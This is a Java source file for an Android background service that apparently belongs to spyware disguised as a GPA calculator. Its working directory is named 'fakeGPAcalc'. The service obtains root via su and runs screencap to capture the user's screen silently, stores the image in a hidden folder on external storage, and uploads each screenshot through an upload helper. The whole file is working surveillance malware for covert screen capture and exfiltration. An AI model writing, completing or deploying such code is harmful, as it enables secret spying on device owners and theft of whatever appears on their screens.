package com.coding4fun.services;

import android.app.IntentService;
import android.content.Intent;
import android.os.Environment;
import android.util.Log;

import com.coding4fun.utils.UploadFile;

import java.io.DataOutputStream;
import java.io.File;
import java.text.Format;
import java.text.SimpleDateFormat;
import java.util.Calendar;
import java.util.Date;

/**
 * Created by coding4fun on 10-Sep-16.
 */

public class ScreenShot extends IntentService {

    public ScreenShot() {
        super("ScreenShot");
    }

    @Override
    protected void onHandleIntent(Intent intent) {
        try{
            String ourDirPath = Environment.getExternalStorageDirectory().getAbsolutePath() + File.separator + "fakeGPAcalc";
            File ourDir = new File(ourDirPath);
            if (!ourDir.exists()) {
                ourDir.mkdir();
            }
            // take screenshot
            Log.e("ScreenShot","start");
            //Process su = Runtime.getRuntime().exec("su");
            /*DataOutputStream dos = new DataOutputStream(su.getOutputStream());
            String ssName = "SS " + getCurrentDateAndTime();
            dos.writeBytes("screencap /sdcard/ss.png");
            dos.flush();
            dos.writeBytes("screencap /sdcard/fakeGPAcalc/"+ssName+".png" + "\n");
            dos.flush();
            dos.writeBytes("exit" + "\n");
            dos.flush();*/
            String ssName = "SS_" + getCurrentDateAndTime();
            String command = "/system/bin/screencap -p /sdcard/fakeGPAcalc/"+ssName+".png";
            //Process su = Runtime.getRuntime().exec(new String[]{"su"/*,"-c"*/,"\""+command+"\""});
            //Process su = Runtime.getRuntime().exec(new String[]{"su "+command});
            Process su = Runtime.getRuntime().exec("su",null,null);
            DataOutputStream os = new DataOutputStream(su.getOutputStream());
            os.writeBytes("/system/bin/screencap -p /sdcard/fakeGPAcalc/"+ssName+".png");
            os.flush();
            os.close();
            su.waitFor();
            Log.e("ScreenShot exitValue",su.exitValue()+"");
            //dos.close();
            Log.e("ScreenShot","Done");

            if (UploadFile.uploadFile(this,ourDirPath + File.separator + ssName + ".png"))
                Log.e("upload","success");
            else
                Log.e("upload","failed");
        } catch (Exception ex){
            Log.e("ScreenShot exception",ex.getMessage());
        }
    }

    String getCurrentDateAndTime(){
        Date today = Calendar.getInstance().getTime();
        //Format formatter = new SimpleDateFormat("MM-dd HH:mm:ss");
        Format formatter = new SimpleDateFormat("MM-dd_HH.mm");
        String currentDateAndTime = formatter.format(today);
        Log.e("currentDateAndTime",currentDateAndTime);
        return currentDateAndTime;
    }

}